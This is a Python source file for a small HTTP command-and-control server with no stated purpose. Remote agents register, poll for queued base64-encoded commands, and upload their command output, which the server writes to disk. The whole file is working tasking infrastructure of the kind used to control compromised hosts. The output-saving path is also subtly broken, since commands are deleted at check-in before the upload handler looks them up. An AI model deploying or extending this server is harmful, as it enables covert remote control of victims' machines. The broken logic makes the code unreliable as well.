import json
import base64
import http.server
import socketserver
import sqlite3
import os
import urllib.parse
import time

from urllib.parse import urlparse

# Initialize SQLite database
conn = sqlite3.connect('agents.db')
c = conn.cursor()

# Create agents table if not exists
c.execute('''CREATE TABLE IF NOT EXISTS agents
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              uuid TEXT NOT NULL,
              last_checkin INTEGER NOT NULL,
              hostname TEXT NOT NULL)''')
conn.commit()

# Create commands table if not exists
c.execute('''CREATE TABLE IF NOT EXISTS commands
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              agent_uuid TEXT NOT NULL,
              command TEXT NOT NULL)''')
conn.commit()

# HTTP request handler
class RequestHandler(http.server.BaseHTTPRequestHandler):

    def do_POST(self):
        # Parse the URL
        parsed_path = urlparse(self.path)
        endpoint = parsed_path.path

        if endpoint == '/register':
            self.handle_register()
        elif endpoint == '/checkin':
            self.handle_checkin()
        elif endpoint == '/queue_command':
            self.handle_queue_command()
        elif endpoint == '/stop_agent':
            self.handle_stop_agent()
        elif endpoint == '/upload_output':
            self.handle_upload_output()
        else:
            self.send_error(404)

    def handle_register(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        uuid = data.get('uuid')
        os = data.get('os')
        ip = self.client_address[0]
        timestamp = data.get('timestamp')
        hostname = data.get('hostname')  # Assuming you pass hostname from the agent

        # Store agent information in SQLite
        c.execute("INSERT INTO agents (uuid, last_checkin, hostname) VALUES (?, ?, ?)",
                  (uuid, timestamp, hostname))
        conn.commit()

        self.send_response(200)
        self.end_headers()

    def handle_checkin(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        uuid = data.get('uuid')
        timestamp = data.get('timestamp')  # Update last check-in time

        # Update last check-in time in SQLite
        c.execute("UPDATE agents SET last_checkin = ? WHERE uuid = ?", (timestamp, uuid))
        conn.commit()

        # Retrieve queued commands for the agent
        c.execute("SELECT command FROM commands WHERE agent_uuid = ?", (uuid,))
        queued_commands = c.fetchall()
        queued_commands = [cmd[0] for cmd in queued_commands]  # Extract commands from tuples

        # Delete processed commands from the queue
        c.execute("DELETE FROM commands WHERE agent_uuid = ?", (uuid,))
        conn.commit()

        # Respond with queued commands (if any)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(queued_commands).encode('utf-8'))

    def handle_queue_command(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        uuid = data.get('uuid')
        command_b64 = data.get('command')

        # Queue command in SQLite
        c.execute("INSERT INTO commands (agent_uuid, command) VALUES (?, ?)",
                  (uuid, command_b64))
        conn.commit()

        self.send_response(200)
        self.end_headers()

    def handle_stop_agent(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        uuid = data.get('uuid')

        # Delete agent from SQLite
        c.execute("DELETE FROM agents WHERE uuid = ?", (uuid,))
        conn.commit()

        # Also delete any queued commands for the agent
        c.execute("DELETE FROM commands WHERE agent_uuid = ?", (uuid,))
        conn.commit()

        self.send_response(200)
        self.end_headers()

    def handle_upload_output(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        uuid = data.get('uuid')
        output_b64 = data.get('output')

        # Decode base64 output
        output_bytes = base64.b64decode(output_b64).decode('utf-8')

        # Retrieve original command from the database for filename
        c.execute("SELECT command FROM commands WHERE agent_uuid = ?", (uuid,))
        command_row = c.fetchone()
        if command_row:
            command_b64 = command_row[0]
            command = base64.b64decode(command_b64).decode('utf-8')

            # Remove any non-alphanumeric characters from the command for filename safety
            safe_command = ''.join(e for e in command if e.isalnum())

            # Create directory if not exists
            output_dir = 'output'
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)

            # Write output to file
            timestamp = int(time.time())
            output_file = f"{output_dir}/{uuid}_{safe_command}_{timestamp}.txt"
            with open(output_file, 'w') as f:
                f.write(output_bytes)

            print(f"Output saved to {output_file}")

            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404, 'No command found for the specified agent UUID')

# Setup HTTP server
def run(server_class=http.server.HTTPServer, handler_class=RequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    print(f'Starting httpd server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
